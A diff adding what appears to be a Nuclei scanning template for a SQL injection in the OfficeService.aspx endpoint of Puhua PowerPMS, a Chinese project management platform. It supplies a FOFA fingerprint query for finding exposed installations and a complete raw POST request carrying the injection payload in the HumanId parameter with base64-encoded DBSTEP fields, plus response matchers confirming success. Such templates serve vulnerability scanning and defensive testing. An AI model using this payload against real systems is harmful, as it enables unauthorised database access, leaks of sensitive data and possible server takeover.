@@ -1,0 +1,33 @@
+id: powerpms-officeservice-sqli
+info:
+  name: "普华PowerPMS系统OfficeService.aspx接口SQL注入"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="普华科技-PowerPMS" || body="Power.login.init" && body="Power.ui.warning" && body="Power_login_btn"
+          普华PowerPMS是上海普华科技发展股份有限公司开发的项目管理信息平台。该系统OfficeService.aspx接口存在SQL注入缺陷，攻击者可利用该漏洞执行恶意SQL语句，导致数据库敏感信息泄露，并在具备高权限的情况下实施远程代码执行或服务器控制。
+  tags: 普华科技-PowerPMS
+http:
+- raw:
+  - |
+    POST /PowerPlat/FormXml/DocFile/OfficeService.aspx?HumanId=1'or+'1'='1 HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    DBSTEP V3.0     135             0               8               DBSTEP=REJTVEVQ
+    OPTION=TE9BRE1BUktMSVNU
+    USERNAME=YWRtaW4=
+    TEMPLATE=dGVzdC50eHQ=
+    FILENAME=dGVzdC50eHQ=
+    RECORDID=dHh0
+    FILETYPE=dHh0
+    123456
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - 'DBSTEP'
